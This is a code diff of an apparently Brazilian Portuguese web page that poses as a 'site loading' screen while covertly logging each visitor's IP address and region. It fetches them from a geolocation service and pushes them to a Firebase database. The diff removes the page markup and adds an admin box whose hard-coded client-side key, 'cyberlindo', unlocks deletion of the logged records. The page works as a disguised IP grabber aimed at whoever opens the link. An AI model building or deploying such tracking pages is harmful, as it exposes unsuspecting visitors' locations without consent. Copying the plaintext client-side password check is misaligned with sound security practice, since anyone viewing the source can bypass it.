@@ -1,56 +1,3 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Site esta carrengando</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-  <style>
-    *, *::after, *::before{margin:0;padding:0;box-sizing:border-box;}
-    body{background:#0a1226;font-family:'Roboto',sans-serif;color:#fff;min-height:100vh;}
-    .container{width:min(95%,600px);margin:auto;padding:30px;animation:fadeInUp 0.5s ease-out;}
-    @keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0);}}
-    h1{text-align:center;font-size:1.5em;margin-bottom:10px;text-shadow:0 0 8px #00f5ff;}
-    .subtitle{text-align:center;color:#a8a8a8;margin-bottom:25px;font-size:0.95em;}
-    .card{background:rgba(10,25,50,0.8);border:1px solid #2a3853;border-radius:10px;padding:20px;margin:15px 0;position:relative;}
-    .card:first-of-type{background:linear-gradient(145deg,#000d1a,#0a253f);}
-    .ip, .region, .time{margin:8px 0;}
-    .ip span, .region span{font-family:monospace;letter-spacing:1px;}
-    .time{text-align:right;font-size:0.8em;color:#55ccff;}
-    .warning{background:#1a0f0f;border:1px solid #ff4b4b;border-radius:8px;padding:12px;margin:15px 0;font-size:0.9em;text-align:center;}
-    .warning > b{color:#ff4b4b;}
-    .empty{text-align:center;color:#444;font-style:italic;margin-top:50px;}
-    .loader{border:4px solid rgba(0,0,0,0.1);border-top-color:#00f5ff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:10px auto;}
-    @keyframes spin{to{transform:rotate(360deg);}}
-    @media(max-width:600px){.container{padding:15px;font-size:0.9em;}}
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>Cyber-Geo LIVE</h1>
-    <p class="subtitle">Espera um pouco quase la/p>
-
-    <div class="warning"><b>⚠️</b>Site ofc</div>
-
-    <div id="loading" style="text-align:center;">
-      <p>Carregando localização&hellip;</p>
-      <div class="loader"></div>
-    </div>
-
-    <div id="main-card" class="card" style="display:none;">
-      <div class="ip"><strong>IP:</strong> <span id="ip-value"></span></div>
-      <div class="region"><strong>Região:</strong> <span id="region-value"></span></div>
-      <div class="time" id="time-value"></div>
-    </div>
-
-    <div id="empty-msg" class="empty" style="display:none;">
-      Nenhum dado coletado ainda (o rolê aparece aqui em segundos!) 👀
-    </div>
-
-    <div id="list" style="margin-top:30px;"></div>
-  </div>
-
 <script>
 /* ====== CONFIGURAÇÕES ====== */
 const config = {
@@ -63,7 +10,6 @@ const config = {
   databaseURL: "https://cyber-a41d9-default-rtdb.firebaseio.com/"
 };
 
-/* ====== GERA HTML GERAL ====== */
 document.addEventListener("DOMContentLoaded", () => {
   const ipValueEl   = document.getElementById("ip-value");
   const regionValueEl = document.getElementById("region-value");
@@ -83,6 +29,7 @@ document.addEventListener("DOMContentLoaded", () => {
   setTimeout(() => {
     firebase.initializeApp(config);
     const db = firebase.database();
+
     /* ====== PEGAR IP & REGIÃO ====== */
     fetch("https://geolocation-db.com/json/")
       .then(r => r.json())
@@ -130,8 +77,56 @@ document.addEventListener("DOMContentLoaded", () => {
       });
       if (ips.length === 0) emptyMsgEl.style.display = "block";
     });
-  }, 500);
+
+    /* ====== SISTEMA DE KEY ====== */
+    const keyBox = document.createElement("div");
+    keyBox.style.position = "fixed";
+    keyBox.style.bottom = "10px";
+    keyBox.style.right = "10px";
+    keyBox.style.background = "#111";
+    keyBox.style.padding = "10px";
+    keyBox.style.borderRadius = "8px";
+    keyBox.innerHTML = `
+      <input type="password" id="key-input" placeholder="Digite a key" style="padding:5px;border:none;border-radius:5px;">
+      <button id="check-key" style="padding:5px 10px;margin-left:5px;">OK</button>
+      <button id="clear-btn" style="padding:5px 10px;margin-left:5px;display:none;background:#ff4b4b;color:#fff;border:none;border-radius:5px;">
+        Limpar Dados
+      </button>
+    `;
+    document.body.appendChild(keyBox);
+
+    const keyInput = document.getElementById("key-input");
+    const checkKeyBtn = document.getElementById("check-key");
+    const clearBtn = document.getElementById("clear-btn");
+
+    checkKeyBtn.addEventListener("click", () => {
+      if (keyInput.value === "cyberlindo") {
+        clearBtn.style.display = "inline-block";
+        alert("Key aceita! Você pode limpar os dados.");
+      } else {
+        alert("Key incorreta!");
+      }
+    });
+
+    clearBtn.addEventListener("click", () => {
+      if (keyInput.value === "cyberlindo") {
+        db.ref("ip_list").remove()
+          .then(() => {
+            alert("Todos os dados foram limpos!");
+            listEl.innerHTML = "";
+            mainCardEl.style.display = "none";
+            emptyMsgEl.style.display = "block";
+
+            // Mensagem de log visível para todos
+            db.ref("ip_list").push({
+              ip: "⚠️ Dados resetados pelo admin",
+              country: "Sistema",
+              timestamp: new Date().toISOString()
+            });
+          })
+          .catch(err => alert("Erro ao limpar: " + err));
+      }
+    });
+  }, 200); // tempo reduzido para carregar mais rápido
 });
 </script>
-</body>
-</html>
